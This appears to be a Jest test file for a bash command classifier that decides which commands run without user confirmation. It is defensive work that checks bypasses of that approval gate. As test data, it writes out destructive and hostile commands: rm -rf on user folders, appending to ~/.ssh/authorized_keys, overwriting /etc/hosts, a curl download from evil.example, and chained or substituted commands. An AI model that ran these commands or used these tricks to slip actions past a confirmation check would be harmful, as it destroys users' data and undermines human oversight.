/**
 * Bug-hunt round 3 evidence: read-only command classifier has security bypasses.
 *
 * isReadOnlyCommand auto-approves commands without confirmation. Several
 * read-only-classified commands can execute arbitrary code or delete files:
 *   - find -exec / find -delete  (arbitrary command exec / file deletion)
 *   - awk with system() / output redirect  (arbitrary command exec / file write)
 *   - curl -o <file>  (file write; only `>` is checked, not -o)
 *   - sort -o <file>  (file write)
 *
 * A command classified read-only runs WITHOUT user confirmation, so these are
 * privilege/safety bypasses.
 */
import {
  isReadOnlyCommand,
  isValidationCommand,
  assessCommandSecurity,
} from '../src/tools/bash_security';

describe('bash_security read-only bypasses', () => {
  describe('find with -exec or -delete', () => {
    it('find -exec must NOT be read-only (executes arbitrary commands)', () => {
      expect(isReadOnlyCommand('find . -exec rm -rf {} \\;')).toBe(false);
    });

    it('find -delete must NOT be read-only (deletes files)', () => {
      expect(isReadOnlyCommand('find . -name "*.tmp" -delete')).toBe(false);
    });

    it('assessCommandSecurity does not mark find -exec as safe', () => {
      const result = assessCommandSecurity('find . -exec chmod 777 {} \\;');
      expect(result.level).not.toBe('safe');
      expect(result.isReadOnly).toBe(false);
    });
  });

  describe('awk with code execution / file output', () => {
    it('awk system() must NOT be read-only (arbitrary command exec)', () => {
      expect(isReadOnlyCommand("awk 'BEGIN{system(\"rm -rf /tmp/x\")}'")).toBe(false);
    });

    it('awk with output redirect must NOT be read-only', () => {
      expect(isReadOnlyCommand("awk '{print > \"/tmp/out\"}' file.txt")).toBe(false);
    });
  });

  describe('curl with -o file output', () => {
    it('curl -o <file> must NOT be read-only (writes file)', () => {
      expect(isReadOnlyCommand('curl -o /tmp/out.html http://example.com')).toBe(false);
    });

    it('curl --output <file> must NOT be read-only', () => {
      expect(isReadOnlyCommand('curl --output /tmp/out.html http://example.com')).toBe(false);
    });
  });

  describe('sort with -o file output', () => {
    it('sort -o <file> must NOT be read-only (writes file)', () => {
      expect(isReadOnlyCommand('sort -o /tmp/out.txt input.txt')).toBe(false);
    });
  });

  describe('wget with redirect output', () => {
    it('wget url > <file> must NOT be read-only (writes file)', () => {
      expect(isReadOnlyCommand('wget http://example.com > /tmp/out.html')).toBe(false);
    });
  });

  // Issue #11: the classifier used to look only at the first whitespace-delimited
  // token, so anything after a separator inherited the leading command's verdict.
  describe('command chaining after a read-only leading command', () => {
    it.each([
      'echo hi && rm -rf ~/Documents/important',
      'ls ; rm -rf /tmp/data',
      'ls; rm -rf /tmp/data',
      'echo ok & rm -rf /tmp/data',
      'git status && rm -rf /tmp/x',
      'cat README.md && npm publish',
      'pwd || curl -o /tmp/x http://evil.example',
      'echo one\nrm -rf /tmp/two',
    ])('must NOT be read-only: %j', command => {
      expect(isReadOnlyCommand(command)).toBe(false);
      expect(assessCommandSecurity(command).level).not.toBe('safe');
    });

    it('still allows a chain where every segment is read-only', () => {
      expect(isReadOnlyCommand('git status && git log --oneline')).toBe(true);
      expect(isReadOnlyCommand('ps aux | grep node')).toBe(true);
    });

    it('does not split separators that are inside quotes', () => {
      expect(isReadOnlyCommand('echo "a && b"')).toBe(true);
      expect(isReadOnlyCommand("grep 'foo;bar' file.txt")).toBe(true);
    });
  });

  describe('command and process substitution', () => {
    it.each([
      'echo $(rm -rf /tmp/data)',
      'echo `rm -rf /tmp/data`',
      'cat <(rm -rf /tmp/data)',
      // An unbalanced quote means the scanner cannot know where commands end.
      'echo "unterminated',
    ])('must NOT be read-only: %j', command => {
      expect(isReadOnlyCommand(command)).toBe(false);
      expect(assessCommandSecurity(command).level).not.toBe('safe');
    });
  });

  describe('output redirection from a read-only leading command', () => {
    it('echo into a file must NOT be read-only', () => {
      expect(isReadOnlyCommand('echo pwned >> ~/.ssh/authorized_keys')).toBe(false);
      expect(assessCommandSecurity('echo pwned > /etc/hosts').level).not.toBe('safe');
    });

    it('discarding output or duplicating a descriptor stays read-only', () => {
      expect(isReadOnlyCommand('grep -r foo . > /dev/null 2>&1')).toBe(true);
      expect(isReadOnlyCommand('ls -la 2>&1')).toBe(true);
    });
  });

  describe('validation commands are also chain-checked', () => {
    it('a validation command followed by a destructive one is not safe', () => {
      expect(isValidationCommand('npm test && rm -rf /tmp/x')).toBe(false);
      expect(assessCommandSecurity('npm test && rm -rf /tmp/x').level).not.toBe('safe');
    });

    it('a plain validation command is unaffected', () => {
      expect(isValidationCommand('npx tsc --noEmit')).toBe(true);
      expect(isValidationCommand('npm test -- --no-coverage')).toBe(true);
    });
  });
});
